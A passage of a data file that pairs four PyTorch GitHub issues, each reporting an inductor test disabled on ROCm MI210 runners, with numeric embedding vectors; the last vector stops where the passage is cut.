"DISABLED test_max_autotune_cutlass_backend_mm_bias_dynamic_False_max_autotune_gemm_backends_ATen, Triton, CUTLASS (__main__.TestDoBench) module: rocm triaged skipped","Platforms: rocm

This test was disabled because it is failing on MI210 runners as part of https://github.com/pytorch/pytorch/pull/105980:
https://github.com/pytorch/pytorch/actions/runs/5744430164/job/15572649474

cc @jeffdaily @sunway513 @pruthvistony @ROCmSupport @dllehr-amd @jataylo @hongxiayang",False,"[-9.51955467e-02  1.03336060e-02 -1.21872582e-01 -1.10947691e-01
  1.39001142e-02 -3.83643433e-02  2.67796874e-01  1.48271829e-01
 -6.05413973e-01 -2.36322820e-01  1.98720261e-01 -3.98415148e-01
  1.90122560e-01  1.24770403e-03 -4.69747007e-01  2.34742522e-01
 -3.22783217e-02  6.33528307e-02  1.33977413e-01 -6.87621385e-02
 -1.48700833e-01 -1.33403420e-01 -3.94037396e-01  1.64781004e-01
 -2.31640071e-01  2.64320672e-01 -3.11345398e-01  2.22711891e-01
 -2.47678876e-01  1.76642478e-01  5.19383475e-02  1.56138867e-01
  1.51813686e-01 -2.52697431e-03  3.72369438e-01 -1.55566037e-01
 -2.84941822e-01 -2.92966723e-01 -3.29679884e-02 -6.51496500e-02
 -4.62528728e-02 -2.96565257e-02  2.28300150e-02  1.45040154e-01
  6.08352199e-02  4.93696071e-02 -1.11216344e-01  2.10074127e-01
 -8.34202766e-02 -8.18146393e-02  1.25159398e-01  6.21951520e-02
 -3.57128173e-01 -3.56027663e-01 -1.09607935e-01  1.30828381e-01
  1.87447011e-01  3.13839644e-01  2.80100070e-02  3.14253420e-01
  1.82225972e-01  6.09452017e-02 -4.00438681e-02 -4.83750552e-03
 -5.32670170e-02  3.04375082e-01 -1.26405314e-01 -2.97010541e-01
  4.17834163e-01  1.40291512e-01  6.10996112e-02 -4.80952337e-02
 -2.24838302e-01  2.47099653e-01  2.31324628e-01  2.31341645e-01
 -2.11030006e-01 -1.73779219e-01 -2.04703301e-01 -2.67853439e-01
 -3.12314898e-01 -4.81212139e-02 -1.01466607e-02 -2.93240249e-01
  4.80254471e-01 -2.55752057e-01  2.37311020e-01 -5.18282764e-02
  3.26231774e-03  1.72868103e-01  4.52651858e-01  2.24114656e-02
  1.98296905e-01  1.60270050e-01  9.78140980e-02 -5.99690042e-02
  9.72656459e-02 -1.76601425e-01 -3.74533325e-01  1.71434119e-01
  1.61537334e-01 -1.92678005e-01 -3.18762720e-01  2.41509542e-01
 -3.24054718e-01 -8.67490619e-02  2.61198342e-01 -8.11313093e-02
 -2.44856682e-02  1.55163884e-01  2.08388180e-01 -9.36943442e-02
  3.31051424e-02  3.29775810e-01 -6.89675584e-02  1.62017912e-01
 -1.81583986e-01 -1.19512439e-01  3.33810672e-02  4.09803659e-01
 -6.59973696e-02 -3.13776433e-01  1.70594782e-01 -1.11690760e-02
  2.57680297e-01 -1.95522904e-01 -1.30137587e-02  1.59522444e-02
  3.30851935e-02 -7.35260323e-02  2.17226371e-01 -1.99631974e-01
 -6.18924536e-02 -1.17820799e-02 -3.20406556e-01  2.04145819e-01
 -7.82167912e-03 -2.62017369e-01  1.15551323e-01  2.08634824e-01
 -3.87572467e-01  1.29210860e-01  2.54150759e-02  1.06557071e-01
  9.52478647e-02  1.00769669e-01 -5.56501448e-01  1.53168887e-01
  1.86608583e-02 -1.12969205e-01 -2.70790141e-03 -7.98465386e-02
 -3.84387821e-02  4.43677157e-01 -6.45385031e-03  4.39612679e-02
  6.24873042e-01  1.61711231e-01 -1.50496751e-01 -1.92902774e-01
 -2.90987641e-03  5.67495711e-02 -1.37124747e-01 -1.17718935e-01
  2.94583738e-01  3.63760069e-03 -3.68334413e-01  1.44286871e-01
 -9.16635022e-02  4.15491402e-01  3.64487529e-01  1.32386863e-01
  5.65828383e-02 -1.85986951e-01  7.02805519e-02 -2.29549855e-01
  6.70927763e-02 -2.33585149e-01 -1.93531498e-01  5.77304661e-02
  1.78009868e-02  6.82857558e-02  4.11297917e-01 -2.80279201e-02
 -2.38340124e-01  2.40921557e-01 -4.39344198e-02  1.89337194e-01
  7.09442049e-02 -8.36548656e-02 -1.39106736e-01  9.34490263e-02
  1.85017556e-01  6.74257725e-02 -3.37748557e-01 -2.00290874e-01
  1.06795795e-01 -1.95152789e-01  5.04351780e-02 -1.12304594e-02
  6.63088784e-02  1.41222373e-01 -2.52016634e-02 -4.67684090e-01
  8.22441652e-02  2.68091075e-02 -2.33755589e-01 -4.38550711e-01
  2.10093543e-01  3.76431465e-01 -1.68058842e-01 -5.41947365e-01
 -2.20538914e-01 -1.72611088e-01 -5.80635294e-02 -1.44571066e-04
  1.86744153e-01 -3.86648104e-02 -2.37946212e-01 -2.21305154e-02
 -1.88096389e-02 -1.90473691e-01 -2.15151176e-01 -3.41133982e-01
 -4.01972830e-01 -4.63528857e-02 -7.17362165e-02  1.50750712e-01
 -2.04927996e-02  7.25494623e-02  8.81638154e-02  8.38512480e-02
  1.15403742e-01  8.76867026e-02  3.39249104e-01 -6.86025620e-02
 -8.80453289e-02 -3.03330839e-01 -1.46499544e-01  1.23628072e-01
 -1.13843024e-01 -2.65814885e-02 -1.35311037e-01  5.62691279e-02
  1.44915700e-01  1.81167826e-01 -2.36283988e-01  3.40530090e-03
 -3.48051965e-01  1.96683139e-01 -2.32480451e-01 -6.76736087e-02
  1.46924615e-01  2.04688042e-01  5.38392588e-02  3.41685951e-01
 -1.77785039e-01  9.78557840e-02  1.00388035e-01 -1.20011188e-01
  1.71604931e-01  2.46784747e-01 -1.57213181e-01  7.06189275e-01
  3.69254708e-01  2.06179708e-01 -3.43083024e-01 -1.27689242e-02
  3.16024059e-03 -5.73614947e-02  1.17545635e-01 -4.16198850e-01
  2.17796862e-01 -8.61387551e-02  4.49592620e-01 -9.68769938e-02
  3.29165012e-01  7.86464065e-02 -2.85788417e-01  1.48370545e-02
  4.11459543e-02  2.57998705e-01 -1.13749906e-01  3.06282610e-01
  2.52204567e-01 -8.01948383e-02 -9.76562500e-02 -4.11879778e-01
 -2.18341380e-01 -2.03873545e-01 -2.06940267e-02  3.87083143e-01
  2.71904528e-01 -1.37593716e-01 -2.96233833e-01  9.73853022e-02
  2.95434833e-01 -4.08689305e-03  5.30334637e-02 -1.11884512e-02
 -3.20946634e-01  1.53395742e-01  1.89430028e-01 -4.01429653e-01
 -1.55780762e-01 -6.79354370e-02  1.40316457e-01  3.21715146e-01
  1.30940378e-01 -2.95219570e-01 -1.34911507e-01  2.26195276e-01
  6.93565756e-02  3.85826290e-01 -5.48618473e-02  2.89983470e-02
  5.13775684e-02  3.47558498e-01  7.47212097e-02 -1.63535178e-02
  2.86600798e-01 -2.33910099e-01 -1.90152839e-01  4.31902170e-01
  4.12247926e-02  2.74882376e-01 -3.35083067e-01 -1.96864024e-01
 -4.61252481e-02 -2.79203236e-01  1.69372767e-01 -1.87479660e-01
 -3.44085157e-01  1.01871297e-01 -1.36820167e-01 -1.35792956e-01
 -5.65545745e-02  5.67031980e-01  2.68615663e-01 -3.61812532e-01
 -1.66024432e-01  2.80854702e-02  1.86341643e-01 -1.49176523e-01
 -1.87490359e-01  4.75298911e-02  2.18825147e-01  4.36045110e-01
  3.62304747e-02  1.94559395e-01  1.27205223e-01  4.92781475e-02
 -2.98639610e-02 -3.42674069e-02  5.95230609e-02  3.88078034e-01
 -2.83921268e-02  2.70169377e-01 -2.87878476e-02  1.35153025e-01
 -1.40644563e-02 -2.89331794e-01 -7.11584330e-01 -3.76179293e-02
  1.18519194e-01 -3.55697155e-01 -5.01342118e-04 -4.73346561e-04
  2.93956161e-01 -4.09609452e-03 -2.50928462e-01  1.12216324e-02
 -1.36243224e-01 -1.17613733e-01  3.45124185e-01 -4.72887009e-02
  5.52402854e-01 -1.26007020e-01 -2.11689204e-01  2.09241286e-01
  1.03071600e-01 -1.47955418e-01 -7.63654411e-02  3.27469371e-02]"
"DISABLED test_max_autotune_cut_addmm_dynamic_False_max_autotune_gemm_backends_ATen, Triton, CUTLASS (__main__.TestDoBench) module: rocm triaged skipped","Platforms: rocm

This test was disabled because it is failing on MI210 runners as part of https://github.com/pytorch/pytorch/pull/105980:
https://github.com/pytorch/pytorch/actions/runs/5744430164/job/15572649474

cc @jeffdaily @sunway513 @pruthvistony @ROCmSupport @dllehr-amd @jataylo @hongxiayang",False,"[-8.60721841e-02 -1.02584744e-02 -5.00580557e-02 -1.64935932e-01
 -6.55717105e-02 -2.00356003e-02  3.54246080e-01  1.01148874e-01
 -6.48861825e-01 -1.22885674e-01  2.97858715e-01 -3.73327613e-01
  2.05742911e-01  9.90213156e-02 -4.18265909e-01  1.62869036e-01
 -6.46575242e-02  1.76444501e-02  9.33381468e-02 -1.89885292e-02
 -3.97774577e-02 -9.88312066e-02 -3.67493391e-01  1.36947632e-01
 -2.25835562e-01  3.17078710e-01 -2.70925879e-01  1.72737807e-01
 -2.52584159e-01  1.31671101e-01  8.44638795e-02  1.61586031e-01
  2.02155992e-01 -1.29005052e-02  4.32287991e-01 -1.74516693e-01
 -3.17444146e-01 -2.58470356e-01 -6.07877001e-02 -1.88717842e-01
 -6.41527325e-02 -6.54579848e-02  1.96405593e-02  1.10854827e-01
  3.60025913e-02  1.31569086e-02 -1.15023173e-01  1.74465343e-01
 -4.24815342e-02 -6.96726292e-02  7.68970251e-02  7.17008207e-03
 -2.97689021e-01 -3.71224046e-01 -5.04390821e-02  1.79541498e-01
  1.92546517e-01  2.92307973e-01  8.03731233e-02  3.47826660e-01
  1.64335743e-01 -5.09710284e-03 -4.03649062e-02  5.75791150e-02
  1.71459466e-02  3.68291080e-01 -1.17292546e-01 -2.88892686e-01
  3.66950154e-01  1.84665233e-01 -4.61655669e-03 -7.13516325e-02
 -1.62505642e-01  2.19261616e-01  2.27835953e-01  2.22527549e-01
 -2.94487268e-01 -1.98477924e-01 -2.43859902e-01 -1.90673470e-01
 -3.40048254e-01 -7.50418846e-03 -2.84020975e-02 -3.41364443e-01
  4.18350995e-01 -2.06817657e-01  2.09325254e-01 -1.01687729e-01
  7.30882809e-02  1.40478522e-01  3.57328087e-01  9.87074897e-03
  1.55143738e-01  1.25916317e-01  7.98631161e-02 -8.61677304e-02
 -8.70643556e-03 -1.80185497e-01 -4.12418038e-01  1.17022455e-01
  1.33140504e-01 -1.24397472e-01 -2.99746275e-01  1.90059066e-01
 -3.27014923e-01 -7.58864954e-02  2.06016302e-01 -1.29759401e-01
 -7.75618330e-02  2.91104376e-01  1.46813840e-01 -7.80145377e-02
 -2.20611747e-02  2.94906944e-01 -5.03124110e-02  2.93579757e-01
 -8.34793970e-02 -1.52010128e-01  7.63737857e-02  3.71109009e-01
 -5.91821671e-02 -4.75344628e-01  8.38551223e-02  5.05460724e-02
  1.93096593e-01 -1.24924690e-01  1.64505485e-02 -1.53081976e-02
  7.32794106e-02 -1.23906597e-01  1.54821634e-01 -1.37997419e-01
 -1.96673442e-02  8.41404684e-03 -3.50731730e-01  1.89705253e-01
  7.36500882e-03 -2.54964828e-01  8.57777148e-02  2.75096118e-01
 -4.00477052e-01  2.32067198e-01 -4.02919613e-02  7.08522722e-02
  1.16786189e-01  9.36542600e-02 -5.16734481e-01  8.81648585e-02
 -1.90943480e-04 -6.93822950e-02 -6.20436296e-02 -8.80107284e-02
 -2.57925894e-02  6.13144517e-01  3.11839348e-03  4.90940809e-02
  6.09545887e-01  1.09110653e-01 -1.37537539e-01 -1.58596545e-01
 -2.06698403e-02  1.22640237e-01 -2.63484996e-02 -5.85309193e-02
  2.96595335e-01  2.54026689e-02 -4.03285980e-01  1.67194545e-01
 -1.13398969e-01  3.60502541e-01  2.67097414e-01  1.46823525e-01
  2.71770116e-02 -2.24254310e-01  7.42592514e-02 -2.37403184e-01
  9.45488364e-02 -2.82844275e-01 -1.31602660e-01  2.39532664e-02
  2.95647737e-02  1.07728913e-01  4.40239221e-01 -6.97899461e-02
 -3.22538048e-01  1.54908568e-01 -2.05258261e-02  1.54320449e-01
  6.63238764e-02 -1.84332490e-01 -1.13125458e-01  1.50063321e-01
  2.03918874e-01  5.87754659e-02 -3.29593837e-01 -2.09215716e-01
  8.23533237e-02 -1.95893168e-01  6.87685683e-02 -5.42286411e-02
  1.89749032e-01  2.00091243e-01 -4.18642256e-03 -5.28913438e-01
  5.74149340e-02  1.81699358e-02 -2.75753379e-01 -3.53248626e-01
  2.20310554e-01  2.91315854e-01 -1.39830232e-01 -5.37864804e-01
 -1.47174895e-01 -2.27828383e-01 -8.73511881e-02  4.53323200e-02
  1.31666362e-01 -4.16705869e-02 -2.79928684e-01 -4.78000753e-02
 -7.41360113e-02 -1.62919864e-01 -2.31333524e-01 -3.11268300e-01
 -3.60201150e-01 -8.83828849e-02 -6.24825135e-02  1.00370310e-01
 -1.83714628e-02  1.64312143e-02  2.07991153e-02  3.78652290e-02
  1.66247636e-01  1.87835284e-02  2.42640197e-01 -2.80251559e-02
 -1.24021508e-01 -2.51429856e-01 -1.09934062e-01  1.06360115e-01
 -1.00403950e-01 -2.07806662e-01 -9.19815004e-02  7.91474581e-02
  1.46345884e-01  1.84779972e-01 -2.61547863e-01  4.86854464e-04
 -3.36329460e-01  2.19741896e-01 -2.28352129e-01 -2.41132937e-02
  1.41797572e-01  2.45550409e-01  9.59297642e-03  3.35677505e-01
 -1.16526246e-01  1.07959963e-01  7.84264952e-02 -1.23898208e-01
  2.32685655e-01  3.31917673e-01 -1.63561225e-01  7.50290513e-01
  3.62812996e-01  1.58668965e-01 -3.48556101e-01 -3.07129845e-02
 -2.32765395e-02 -8.74232650e-02  1.85536727e-01 -4.62647825e-01
  1.30225927e-01 -2.33092234e-02  4.14701492e-01 -1.06604785e-01
  3.28014016e-01 -2.85596624e-02 -2.78597236e-01  1.21255279e-01
  7.43070394e-02  1.03703074e-01 -8.74063373e-02  3.12250733e-01
  2.31001705e-01 -5.89953400e-02 -6.55950606e-02 -4.41377819e-01
 -2.34993905e-01 -1.50013298e-01  1.84715129e-02  4.01882976e-01
  2.73750663e-01 -5.05894274e-02 -4.05026913e-01  1.92464054e-01
  2.74655700e-01  8.45517963e-03  9.74857062e-02 -1.02624148e-01
 -3.57709289e-01  1.31011754e-01  1.34435415e-01 -5.51468015e-01
 -1.63463756e-01 -3.98018658e-02  9.29895341e-02  3.45683128e-01
  9.72577482e-02 -2.64813304e-01 -1.06804751e-01  3.06238055e-01
  5.77251390e-02  4.39162761e-01 -2.15023495e-02  1.11850858e-01
  4.50678356e-02  3.57387811e-01 -7.30720758e-02  5.44094741e-02
  3.00978720e-01 -2.43338764e-01 -2.09458798e-01  3.89590293e-01
  1.16373241e-01  2.57787794e-01 -2.53039867e-01 -1.15344137e-01
 -4.61439490e-02 -3.22308928e-01  2.07381308e-01 -1.45082533e-01
 -3.53540003e-01  1.09438092e-01 -1.88904911e-01 -2.36543745e-01
 -2.56822258e-03  6.05302572e-01  2.54606903e-01 -3.84531915e-01
 -7.06588924e-02  4.84705828e-02  1.23093382e-01 -2.04227179e-01
 -2.18121156e-01  6.81634024e-02  2.26532280e-01  3.73996913e-01
 -3.00726518e-02  2.77615130e-01  1.45070910e-01  1.15692437e-01
 -1.54970996e-02  4.18748260e-02  6.82061538e-03  4.19470429e-01
 -4.59080562e-04  2.00322956e-01 -9.66949835e-02  1.36767596e-01
  2.03716308e-02 -2.39098668e-01 -7.02917933e-01  9.78865288e-03
  4.27105576e-02 -2.96342850e-01 -1.25209428e-02 -9.59406123e-02
  3.54286581e-01  7.80742317e-02 -3.58084381e-01  1.06209740e-01
 -9.32707489e-02 -1.06790267e-01  3.76025558e-01 -8.35535489e-03
  6.65060163e-01 -1.43951938e-01 -1.15812778e-01  3.36342156e-01
  4.70500514e-02 -1.78562030e-01 -1.40696466e-01  1.65867917e-02]"
DISABLED test_unfuse_bias_addmm (__main__.TestPaternMatcher) module: rocm triaged skipped,"Platforms: rocm

This test was disabled because it is failing on MI210 runners as part of https://github.com/pytorch/pytorch/pull/105980:
https://github.com/pytorch/pytorch/actions/runs/5744430164/job/15572649474

cc @jeffdaily @sunway513 @pruthvistony @ROCmSupport @dllehr-amd @jataylo @hongxiayang",False,"[ 3.87216061e-02 -7.17687905e-02 -1.97594717e-01 -1.11670904e-02
  1.52618468e-01 -1.22317567e-01  2.41495520e-01  1.52643789e-02
 -6.36608958e-01 -2.80375451e-01  2.04995245e-01 -5.13128698e-01
  9.80980247e-02  3.25748324e-02 -4.09360021e-01  1.07829962e-02
 -1.11874312e-01 -1.25965282e-01  1.55439615e-01  1.45151597e-02
 -2.96270967e-01 -1.99387476e-01 -3.66969258e-01  7.83272684e-02
 -2.96138883e-01  2.50555754e-01 -2.90288568e-01 -2.29148399e-02
 -3.12217414e-01  2.47037917e-01  2.73015738e-01  1.19247228e-01
  8.62903520e-02 -9.14807618e-02  3.85809600e-01 -6.63279295e-02
 -2.42200628e-01 -2.17765763e-01 -2.18533248e-01 -1.25590801e-01
  1.23417109e-01  2.47076154e-04  2.79667992e-02  1.65135980e-01
 -2.87111640e-01  4.22240719e-02  2.40373313e-02 -2.81604752e-03
 -7.79906586e-02 -2.03140438e-01  1.76817685e-01 -1.54831827e-01
 -2.61930764e-01 -4.68261659e-01 -6.88624606e-02  3.79091203e-02
  2.65422940e-01  3.49753290e-01 -1.36330901e-02  3.52494240e-01
  2.47351974e-02 -8.29615816e-03 -1.14786908e-01 -4.49234247e-03
  3.79101261e-02  3.29292655e-01 -7.80191496e-02 -4.12145048e-01
  4.40694958e-01  4.70713489e-02 -1.46671295e-01  4.90723699e-02
 -8.74001533e-04  1.73957631e-01  2.52040893e-01  4.48779821e-01
 -1.67257935e-02 -3.21134813e-02  1.74757242e-01 -3.12125623e-01
 -2.23680213e-01 -1.00603536e-01  2.39435863e-03 -1.73077285e-01
  3.55566859e-01 -2.58858383e-01  2.28876211e-02 -1.47198796e-01
  1.54459402e-01 -8.35828632e-02  2.02173576e-01  1.48238525e-01
  1.32096857e-01  1.82011008e-01  1.07877195e-01  2.02912576e-02
 -2.17454985e-01  2.35183742e-02 -3.62744272e-01  1.76837057e-01
  3.66016477e-02 -1.48622811e-01 -4.47559178e-01  2.10575238e-01
 -4.23790902e-01 -1.03433333e-01  1.61044091e-01 -2.19120234e-01
 -7.09875003e-02  3.08189273e-01  1.80657282e-01  1.05293617e-01
 -6.97710961e-02  2.72717595e-01  4.33905199e-02  3.08050364e-01
 -6.76066726e-02 -1.27758324e-01 -6.38489947e-02  3.12572718e-01
 -1.90636307e-01 -4.10283655e-01  1.55374169e-01 -3.03291809e-03
  2.11959258e-01 -1.21275283e-01 -7.49005973e-02  2.13336527e-01
 -2.22372301e-02  1.16541469e-02  2.40040049e-02 -7.52075464e-02
  6.40352145e-02  5.70508279e-02 -2.70114958e-01 -8.32633115e-03
  4.28491272e-02 -1.34050041e-01  1.33345306e-01  1.45144537e-01
 -2.30882391e-01  2.92967260e-01 -9.46198255e-02  2.88387612e-02
  1.59271374e-01 -5.86843900e-02 -3.89002502e-01  1.81150705e-01
 -2.50732861e-02  5.21675572e-02  2.33231522e-02 -8.30626339e-02
  3.53602991e-02  6.45131350e-01  6.49913102e-02  8.76894146e-02
  5.01092076e-01  1.52664453e-01 -2.46313691e-01 -1.99994579e-01
 -1.61346853e-01  1.32830575e-01  1.83022991e-02 -1.28580809e-01
  3.18952531e-01 -1.96032561e-02 -4.79567468e-01  9.25631076e-02
  5.89084215e-02  2.96390206e-01  2.89836049e-01  1.75903127e-01
  2.77682185e-01 -1.96314245e-01  9.02895033e-02 -2.54766345e-01
  2.41439432e-01 -3.88183892e-02  3.57118398e-02 -1.17207490e-01
  2.03992471e-01  2.96113715e-02  3.68998230e-01 -1.97183341e-01
 -2.76052892e-01  2.06413507e-01 -5.20066097e-02  7.22808093e-02
 -1.10287875e-01 -9.42033008e-02 -4.14367378e-01  1.88589081e-01
  3.36827934e-02 -9.10447091e-02 -3.21537256e-01 -2.02078164e-01
 -4.97668795e-02 -8.46111029e-02  1.40896082e-01  1.48628265e-01
  1.34039283e-01  2.17939794e-01 -1.78241476e-01 -3.58846784e-01
  8.19870532e-02  1.33744895e-01 -1.30622499e-02 -4.65342164e-01
  1.00126937e-01  4.00791794e-01 -8.20406303e-02 -4.37306821e-01
 -3.66539538e-01 -1.89981997e-01 -9.42759067e-02  1.06675811e-02
 -2.71240268e-02  7.90120736e-02 -2.09439874e-01  5.40015921e-02
  1.21222604e-02 -1.43323928e-01 -2.28882253e-01 -2.48633996e-01
 -4.00967062e-01 -3.08434255e-02  5.94851598e-02  5.39509282e-02
  1.42022306e-02  9.18860137e-02  9.71131995e-02 -1.30138338e-01
  1.71514317e-01  1.72989331e-02  2.12561280e-01 -1.16201490e-01
 -1.13240302e-01 -3.09020102e-01 -9.19040143e-02 -8.52291808e-02
 -1.04285136e-01 -2.57981479e-01 -3.05725396e-01 -9.69289523e-03
  1.91191047e-01  4.35482085e-01 -2.56097496e-01  1.47262946e-01
 -3.94709855e-01  5.05684316e-02  6.03052340e-02 -1.12969145e-01
 -2.52898247e-03  3.59160483e-01 -1.23908415e-01  3.46700817e-01
 -7.54967779e-02  3.30104632e-03  1.75509870e-01 -1.95441425e-01
  2.94074595e-01  3.53440583e-01 -2.85554647e-01  5.54319084e-01
  4.25618529e-01  2.44129151e-01 -4.73314553e-01  1.41595647e-01
 -1.98606938e-01 -4.77419309e-02  1.98806837e-01 -4.39290404e-01
  2.43243366e-01 -4.09407094e-02  2.42525831e-01 -1.14701025e-01
  3.39471281e-01  1.27570510e-01 -3.35098624e-01  1.58840925e-01
  2.03514948e-01  1.55718654e-01 -2.63416115e-02  3.57358277e-01
  2.06818789e-01 -2.17443675e-01 -2.28474379e-01 -4.61730897e-01
 -1.72931984e-01 -7.36794919e-02  1.33993328e-01  3.32506895e-01
  2.19279468e-01  2.33904809e-01 -1.92639366e-01 -8.10133219e-02
  1.91649154e-01  9.31121185e-02  1.98623896e-01  9.55908224e-02
 -2.55455792e-01  6.00033998e-02  1.09769151e-01 -1.69546559e-01
 -1.58202529e-01 -1.88922048e-01 -9.70543623e-02  2.64929235e-01
  4.07843053e-01 -1.86288312e-01 -5.92599213e-02  4.11571637e-02
  7.90477544e-02  4.28555995e-01  5.03194518e-03  2.61600092e-02
 -1.28514946e-01  2.20444277e-01 -3.24744247e-02  1.32017061e-01
  3.84822637e-01 -1.75914228e-01 -1.89397097e-01  1.55309349e-01
  1.39034286e-01  2.53081292e-01 -4.84506190e-01 -3.29801857e-01
 -1.71030939e-01 -1.24353088e-01  2.23738879e-01 -3.11293781e-01
 -2.07652271e-01  1.96695492e-01  7.40169063e-02 -9.81622487e-02
 -3.31465062e-03  5.67232370e-01  1.80459842e-01 -3.59218359e-01
 -2.05548674e-01  2.82492042e-02 -4.65562716e-02 -1.74919099e-01
 -1.56996533e-01 -6.02157861e-02  4.55354571e-01  4.31928426e-01
 -1.43785477e-01  5.48699975e-01  7.07497001e-02  1.96543455e-01
 -1.04643524e-01 -4.60261181e-02 -4.62956093e-02  3.55087340e-01
  2.72102416e-01  1.47976071e-01  1.87717676e-01  2.62589872e-01
 -2.76407063e-01  5.40766269e-02 -4.72019076e-01  4.96642813e-02
  1.35278434e-01 -2.08038971e-01 -1.12428352e-01 -1.14553764e-01
  2.80218303e-01  2.98647940e-01 -3.21300536e-01  7.58200139e-02
 -2.29656100e-01 -6.21802360e-02  3.74933630e-01 -3.78760636e-01
  5.44113040e-01 -2.31000289e-01 -2.17047602e-01  2.61721373e-01
  1.06408946e-01 -2.22929180e-01 -1.11313850e-01 -6.82615936e-02]"
DISABLED test_uint4x2_mixed_mm_gating_works (__main__.TestPaternMatcher) module: rocm triaged skipped,"Platforms: rocm

This test was disabled because it is failing on MI210 runners as part of https://github.com/pytorch/pytorch/pull/105980:
https://github.com/pytorch/pytorch/actions/runs/5744430164/job/15572649474

cc @jeffdaily @sunway513 @pruthvistony @ROCmSupport @dllehr-amd @jataylo @hongxiayang",False,"[-7.27193952e-02 -1.40429646e-01 -1.64253920e-01  1.28808379e-01
  2.77327970e-02 -2.02631950e-01  3.41241360e-01  4.77526672e-02
 -4.97999102e-01 -2.51840770e-01  2.14419186e-01 -2.96235025e-01
  8.77708942e-02  9.03887078e-02 -4.20035720e-01  4.27829511e-02
 -1.64195269e-01 -1.46788269e-01  2.36332804e-01  2.24255919e-02
 -1.32810354e-01 -2.21534550e-01 -2.99229503e-01  5.63936234e-02
 -2.83432662e-01  2.90070474e-01 -2.08667696e-01  1.37545904e-02
 -2.80133486e-01  2.17107564e-01  1.73222601e-01  2.15219945e-01
 -2.63638608e-02 -1.59918085e-01  3.16443354e-01 -6.52697980e-02
 -3.00687313e-01 -1.95773512e-01 -2.97053576e-01 -1.33731365e-01
  1.26652777e-01  6.44452199e-02 -4.34113517e-02  3.78362313e-02
 -1.15027264e-01  2.02960968e-01 -2.65780054e-02  5.24834637e-03
 -1.25179216e-01 -2.43023321e-01  1.93971366e-01 -1.47569656e-01
 -2.00278200e-02 -4.62131411e-01  6.72465935e-02  3.00759077e-02
  2.13241383e-01  3.02604973e-01  4.72624078e-02  3.83961499e-01
  9.47391689e-02 -1.01558998e-01 -1.66088521e-01  4.25349846e-02
  8.23070854e-02  2.26741970e-01 -3.95818278e-02 -3.93953592e-01
  2.76546955e-01  3.19456980e-02 -1.45798638e-01 -1.76978000e-02
 -6.35460019e-02  3.03418577e-01  2.60763824e-01  4.40834761e-01
 -1.48269266e-01  2.39518937e-02  1.33987507e-02 -2.34448388e-01
 -1.64318845e-01 -1.45363659e-02  3.45495120e-02 -2.10508108e-01
  3.50581557e-01 -1.71850756e-01  1.30421873e-02 -8.83860439e-02
  6.70192838e-02 -8.00254494e-02  3.34340751e-01  2.03869134e-01
  7.95378760e-02  6.32181466e-02  3.43550891e-02  5.62039241e-02
 -1.70244247e-01 -1.18997738e-01 -4.90478456e-01  1.07879460e-01
 -1.54707525e-02 -1.18293583e-01 -3.00593495e-01  2.54381925e-01
 -4.44581419e-01 -1.69920683e-01  2.58822978e-01 -1.55133724e-01
 -8.10743496e-03  3.59846056e-01  1.39291987e-01  4.71335202e-02
 -1.44791842e-01  3.56137872e-01  2.63724104e-02  1.85657978e-01
 -1.39728159e-01 -1.32216215e-01  7.37927780e-02  3.84990394e-01
 -2.29620457e-01 -4.33174580e-01  4.44141328e-02  2.31254529e-02
  1.60174459e-01 -2.70059165e-02 -2.76503842e-02  2.22014219e-01
  7.93023258e-02 -1.29512232e-02 -1.13250315e-01 -4.09709252e-02
  3.27229574e-02  2.22891159e-02 -2.52017558e-01 -1.96376294e-02
  6.52229637e-02 -2.41538361e-02  8.96435380e-02  2.52705723e-01
 -2.15585753e-01  3.07961643e-01 -3.05884387e-02 -3.10453270e-02
  1.22719698e-01 -1.82394534e-01 -2.58455694e-01  1.39615476e-01
  7.86820799e-02  4.30750772e-02  1.11140229e-01 -7.64725655e-02
  3.03311162e-02  7.73669362e-01  5.59899509e-02 -9.88408625e-02
  4.29615647e-01  8.73009115e-02 -2.86455989e-01 -4.64202985e-02
 -1.31282568e-01  6.62406236e-02 -3.41655314e-02 -9.86270905e-02
  3.54464710e-01 -6.70867115e-02 -4.05813158e-01  7.97049478e-02
  3.80804352e-02  1.51270807e-01  2.07773596e-01  1.85676545e-01
  2.34334439e-01 -5.75684384e-02  4.19755392e-02 -2.19441116e-01
  2.59467214e-01 -5.58708645e-02 -1.39965236e-01 -4.76738103e-02
  1.73617393e-01  1.18081801e-01  4.13746893e-01 -9.96249691e-02
 -1.99154094e-01  2.58813202e-01  7.32719060e-03  8.56614038e-02
 -8.90525281e-02 -2.85448804e-02 -3.22479188e-01  1.09536581e-01
  9.60029662e-02 -4.65000197e-02 -2.10380167e-01 -2.33743370e-01
 -7.65162706e-02 -2.60352492e-01  2.31042188e-02  9.25581157e-02
  1.74279675e-01  1.88684553e-01 -6.56511784e-02 -4.93989795e-01
  1.92749184e-02  1.78169459e-01 -1.66087091e-01 -4.25151080e-01
  1.94550872e-01  2.26038516e-01 -2.42891349e-02 -3.25492114e-01
 -1.81557715e-01 -1.96356446e-01 -1.65046051e-01  1.14609465e-01
 -4.87160459e-02  1.17416903e-01 -1.62429363e-01  1.34710819e-01
 -6.92998543e-02 -2.57328711e-03 -1.98863775e-01 -3.33916843e-01
 -3.19689125e-01 -5.94532378e-02  1.19255759e-01  9.93518531e-02
 -6.48916066e-02  3.02422978e-02  6.61898926e-02 -2.24071324e-01
  1.84183612e-01  2.57741623e-02  2.20702648e-01 -1.58288091e-01
 -1.36082217e-01 -2.02342004e-01 -1.96172670e-03 -3.15360948e-02
 -2.35552371e-01 -3.31079185e-01 -1.77398950e-01 -1.65816426e-01
  1.73740178e-01  4.04743969e-01 -3.00283313e-01  9.87118017e-03
 -2.80769020e-01  1.46900833e-01  1.39232054e-01 -2.30792686e-02
 -3.35433669e-02  2.81601638e-01 -4.17161733e-04  2.89526045e-01
 -3.74507308e-02 -9.48487520e-02  2.14000106e-01 -1.67875782e-01
  3.45084757e-01  4.44282204e-01 -3.28090668e-01  5.57435513e-01
  4.60434556e-01  3.17280024e-01 -3.91489267e-01  1.24316208e-01
 -1.18060187e-01 -2.87447702e-02  8.63763839e-02 -5.03372371e-01
  2.62492955e-01  5.40335923e-02  2.91915178e-01 -2.07038581e-01
  3.32418054e-01  6.50811940e-02 -2.54594147e-01 -1.48684401e-02
  2.59466052e-01  7.75999874e-02 -8.82066265e-02  2.50001907e-01
  2.65712798e-01 -2.00962707e-01 -1.44557953e-01 -4.47873831e-01
 -2.19021767e-01 -5.54861277e-02  1.78888887e-01  2.51442194e-01
  2.96921551e-01  3.22689384e-01 -3.32710147e-01  1.20372558e-02
  2.60240048e-01 -1.56594478e-02  3.64092171e-01  6.46252856e-02
